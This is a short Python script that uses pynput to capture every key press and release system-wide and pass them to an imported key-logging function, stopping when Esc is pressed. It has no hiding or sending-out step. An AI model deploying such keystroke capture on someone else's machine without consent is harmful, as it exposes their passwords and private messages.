from pynput import keyboard
from key_logger import log_key

def on_press(key):
    try:
        log_key("PRESS", key.char)
    except:
        log_key("PRESS", str(key))

def on_release(key):
    log_key("RELEASE", str(key))
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()